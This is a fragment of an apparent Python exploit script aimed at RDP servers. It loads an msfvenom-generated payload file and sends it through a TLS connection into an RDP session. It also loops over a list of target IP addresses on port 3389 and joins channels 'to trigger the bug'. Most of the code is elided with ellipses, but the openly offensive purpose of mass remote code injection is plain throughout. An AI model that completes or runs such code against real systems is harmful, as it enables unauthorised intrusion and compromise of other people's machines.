...
# Inject the payload into the RDP session
def send_payload(tls):
    # Load the payload generated by msfvenom
    with open("payload.bin", "rb") as f:
        payload = f.read()

    # Send the payload through the TLS connection
...
def start_rdp_connection(ip_addresses, port=3389):
    ...
    for ip in ip_addresses:
        try:
            ...
            # Join channels to trigger the bug
            ...
            info("closing the connection now")
            results[1].close()
